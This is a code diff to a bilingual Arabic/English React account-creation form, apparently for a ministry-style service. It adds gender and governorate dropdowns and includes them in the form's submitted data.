@@ -7,6 +7,8 @@ export default function MOHCreateAccount() {
   const [lang, setLang] = useState<'ar' | 'en'>('ar');
 
   const [userCategory, setUserCategory] = useState('');
+  const [gender, setGender] = useState('');
+  const [governorate, setGovernorate] = useState('');
   const [civilId, setCivilId] = useState('');
   const [password, setPassword] = useState('');
   const [confirmPassword, setConfirmPassword] = useState('');
@@ -36,6 +38,10 @@ export default function MOHCreateAccount() {
       phonePh: 'أدخل رقم الهاتف',
       userCategory: 'حدد فئة المستخدم',
       userCategoryOptions: ['جهة حكومية', 'تسجيل شخصي / أفراد', 'تسجيل شركات / قطاع خاص', 'الجامعة'],
+      gender: 'اختار الجنس',
+      genderOptions: ['ذكر', 'أنثى'],
+      governorate: 'اختار المحافظة',
+      governorateOptions: ['العاصمة', 'حولي', 'الفروانية', 'الأحمدي', 'الجهراء', 'مبارك الكبير'],
       createBtn: 'إنشاء حساب',
       haveAccount: 'لديك حساب بالفعل؟',
       login: 'تسجيل الدخول',
@@ -57,6 +63,10 @@ export default function MOHCreateAccount() {
       phonePh: 'Enter Phone Number',
       userCategory: 'Select User Category',
       userCategoryOptions: ['Government Entity', 'Personal / Individuals', 'Companies / Private Sector', 'University'],
+      gender: 'Select Gender',
+      genderOptions: ['Male', 'Female'],
+      governorate: 'Select Governorate',
+      governorateOptions: ['Capital', 'Hawalli', 'Farwaniya', 'Ahmadi', 'Jahra', 'Mubarak Al-Kabeer'],
       createBtn: 'Create Account',
       haveAccount: 'Already have an account?',
       login: 'Login',
@@ -76,6 +86,7 @@ export default function MOHCreateAccount() {
     outline: 'none',
     direction: isAr ? 'rtl' : 'ltr',
     boxSizing: 'border-box',
+    background: '#fff',
   };
 
   const labelStyle: React.CSSProperties = {
@@ -95,6 +106,8 @@ export default function MOHCreateAccount() {
     sendData({
       data: {
         'فئة المستخدم': userCategory,
+        'الجنس': gender,
+        'المحافظة': governorate,
         'الرقم المدني': civilId,
         'كلمة المرور': password,
         'البريد الإلكتروني': email,
@@ -162,6 +175,36 @@ export default function MOHCreateAccount() {
                   placeholder={tx.civilIdPh}
                   style={inputStyle}
                 />
+              </div>
+
+              {/* Gender */}
+              <div style={{ marginBottom: 20 }}>
+                <label style={labelStyle}>{tx.gender}</label>
+                <select
+                  value={gender}
+                  onChange={(e) => setGender(e.target.value)}
+                  style={{ ...inputStyle, cursor: 'pointer' }}
+                >
+                  <option value="">{tx.gender}</option>
+                  {tx.genderOptions.map((opt: string) => (
+                    <option key={opt} value={opt}>{opt}</option>
+                  ))}
+                </select>
+              </div>
+
+              {/* Governorate */}
+              <div style={{ marginBottom: 20 }}>
+                <label style={labelStyle}>{tx.governorate}</label>
+                <select
+                  value={governorate}
+                  onChange={(e) => setGovernorate(e.target.value)}
+                  style={{ ...inputStyle, cursor: 'pointer' }}
+                >
+                  <option value="">{tx.governorate}</option>
+                  {tx.governorateOptions.map((opt: string) => (
+                    <option key={opt} value={opt}>{opt}</option>
+                  ))}
+                </select>
               </div>
 
               {/* Password */}
